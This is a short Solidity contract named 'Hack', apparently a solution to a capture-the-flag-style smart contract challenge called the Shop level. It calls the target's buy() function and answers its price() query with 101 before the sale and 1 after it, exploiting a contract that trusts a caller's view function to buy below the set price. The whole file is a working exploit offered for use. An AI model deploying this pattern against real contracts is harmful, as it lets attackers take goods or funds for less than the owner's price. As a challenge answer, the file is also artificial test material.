// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./shop.sol";

contract Hack {

    Shop level21 = Shop(0x1fB6E772A2929313A3B592cf22C16c6276014bBc);

    function exploit() external {
        level21.buy();
    }

    function price () external view returns (uint) {
        return level21.isSold() ? 1 : 101;
    }
}
